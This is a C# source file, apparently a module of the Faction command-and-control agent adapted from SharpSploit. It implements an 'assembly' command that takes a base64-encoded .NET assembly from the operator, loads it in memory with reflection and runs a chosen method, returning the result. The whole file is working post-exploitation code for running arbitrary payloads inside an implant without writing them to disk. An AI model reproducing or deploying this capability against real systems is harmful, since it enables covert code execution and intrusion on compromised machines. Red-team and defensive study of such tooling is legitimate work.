using System;
using System.IO;
using System.Collections.Generic;
using Newtonsoft.Json;
using Faction.Modules.Dotnet.Common;
using System.Security.Principal;
using System.Reflection;

namespace Faction.Modules.Dotnet.Commands
{
  // Adapated from Cobbr's SharpSploit project: https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Execution/Assembly.cs
  class ExecuteAssembly : Command
  {
    public override string Name { get { return "assembly"; } }
    public override CommandOutput Execute(Dictionary<string, string> Parameters = null)
    {
      CommandOutput output = new CommandOutput();
      String TypeName = "";
      String MethodName = "Execute";
      Object[] AssemblyParameters = default(Object[]);

      try
      {
        byte[] AssemblyBytes = Convert.FromBase64String(Parameters["Assembly"]);
        if (Parameters.ContainsKey("TypeName"))
        {
          TypeName = Parameters["TypeName"];
        }

        if (Parameters.ContainsKey("MethodName"))
        {
          MethodName = Parameters["MethodName"];
        }

        if (Parameters.ContainsKey("AssemblyParameters"))
        {
          string[] paramList = Parameters["AssemblyParameters"].Split(',');
          AssemblyParameters = new object[paramList.Length];

          int i = 0;

          foreach (string param in paramList)
          {
            AssemblyParameters[i] = param;
            i++;
          }

        }
        Assembly assembly = Assembly.Load(AssemblyBytes);
        Type type = TypeName == "" ? assembly.GetTypes()[0] : assembly.GetType(TypeName);
        MethodInfo method = MethodName == "" ? type.GetMethods()[0] : type.GetMethod(MethodName);
        var results = method.Invoke(null, AssemblyParameters);

        output.Complete = true;
        output.Success = true;
        output.Message = (string)results;
      }
      catch (Exception e)
      {
        output.Complete = true;
        output.Success = false;
        output.Message = e.Message;
      }
      return output;
    }
  }
}
